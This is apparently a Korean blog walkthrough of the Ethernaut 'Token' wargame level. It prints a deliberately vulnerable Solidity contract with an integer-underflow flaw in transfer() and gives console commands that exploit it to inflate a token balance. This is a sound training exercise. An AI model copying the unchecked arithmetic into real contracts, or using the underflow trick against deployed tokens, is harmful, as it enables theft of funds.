---
emoji: 🧢
title: (Ethernaut 취약점 5) Token  
date: '2022-01-07 20:26:00'
author: 한성원
tags: ethernaut Token vulnerability
categories: 취약점분석
---


# 👋 1. Token
__Difficulty 3/10__

- 승리 조건
- 코드 분석
- 풀이
순서로 진행 될 것이다.

- - -

## 승리 조건
- additional token 가져오기(해킹해서 가져오기)

- - -

## 코드 분석
분석은 주석에!

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    
    // address와 balance의 mapping
    mapping(address => uint) balances;
    // 토큰의 총 공급량
    uint public totalSupply;

    // constructor: 총 공급량을 parameter로 한다.
    constructor(uint _initialSupply) public {
        // deployer의 balance를 총 공급량과 같게한다.
        // totalSupply를 patameter의 총 공급량과 같이한다.
        balances[msg.sender] = totalSupply = _initialSupply;
    }
    // Token을 transfer하는 function이다.
    function transfer(address _to, uint _value) public returns (bool) {
        // 만약 msg.sender의 (balance - 보내고싶은 토큰의 양)이 0과 같거나 커야한다. 
        require(balances[msg.sender] - _value >= 0);
        // msg.sender의 잔고에서 보낼 토큰의 양을 뺀다.
        balances[msg.sender] -= _value;
        // 수신자의 잔고에 받을 토큰의 양을 더한다. 
        balances[_to] += _value;
        return true;
    }
    // 하나의 address의 balance를 확인 할 수 있는 view function
    function balanceOf(address _owner) public view returns (uint balance) {
        // return balance of an address
        return balances[_owner];
    }
}
```
- - -

### 풀이를 위한 Setup
[RemixIDE](https://remix.ethereum.org)를 사용한다. 
remix 사용법은 YouTube와 google에 많이 나와있으니 최신것으로 찾아보자!
그리고 docs를 읽어본다면 사용법을 쉽게 익힐 수 있을 것이다.

한 가지 주의할 점은 CoinFlip은 remix에서 바로 deploy하는 것이 아니라 ethernauts에서 만든 instance의 주소를 가지고 addressAt을 누르면 된다.
또한 우리는 Rinkeby Network를 사용하고 있으니 ENVIRONMENT를 "Injected Web3"를 선택해주어야 한다.


## 풀이
이 문제에서 우리는 기본적으로 주어진 20 토큰 이외에 추가적인 토큰을 얻으면 승리한다.

가장 먼저 우리는 코드에 허점을 찾아야 한다. 하지만 지금까지와 문제와 다르게 그러나있는 허점이 없다. ~~이제야 해킹같네ㅎㅋㅎㅋㅎㅋ~~

우선 내가 공부했던 취약점들을 생각해봤다. 그러던 중 token contract의 solidity compiler version은 0.6.0를 확인했다.

Overflow & Underflow는 꾸준히 이슈가 되다가 0.8.0 version에서부터 알아서 처리될 수 있도록 바뀌었다. Overflow & Underflow에 관해서는 __[이 글](https://holyhansss.github.io/vulnerability/over_under_flow/over_under_flow/)__ 에서 찾아볼수 있다.

우리는 이제 이 문제에서 underflow를 활용해 contract에 attack할 수 있다는 것을 알 수 있다.

__바로 Token.transfer()에 가지고 있는 token보다 큰 수를 보내면 나의 token balance가 underflow를 일으키며 상상할 수도 없는 큰 숫자의 token을 가질 수 있게 된다. 이제 코드를 보도록 하자!__

모든 코드는 console창에서 이루어진다. 
ctrl + shift + i를 눌러 console창을 활성화 시키자
```javascript
// 나의 balance를 확인한다: 20개의 Token을 가지고 있을 것이다.
await contract.balanceOf(player)

// contract의 transfer()를 call한다.
// 주소는 metamask를 통해 새로운 주소를 하나 만들었다.
// 내가 가진 토큰의 수 보다 큰 수의 토큰을 보낸다.
await contract.transfer("0x690A732BA98fcfe72bDedE2085816BCF6498058d", 21)

// 다시 나의 balance를 확인해보면 엄청 큰 수의 토큰을 얻을 것을 확인 할 수 있다.
await contract.balanceOf(player)
```

완료 후 ethernaut으로 돌아와 Submit instance를 누르고 조금 기다리면 block이 mine되고, 아래와 같이 뜨며 마무리된다.
```
٩(- ̮̮̃-̃)۶ Well done, You have completed this level!!!
```
- - -
## 마무리
overflow와 underflow는 이미 공부했던 취약점이어서 쉽게 해결 할 수 있었다. 빠르게 6도 ㄱㄱ 해봅시다~~

- - -
## 기타 정보
- rinkeyb network ether faucet: https://faucets.chain.link/rinkeby
- ethernaut: https://ethernaut.openzeppelin.com/
- remix IDE: https://remix.ethereum.org
- overflow & underflow 취약점: https://holyhansss.github.io/vulnerability/over_under_flow/over_under_flow

```toc

```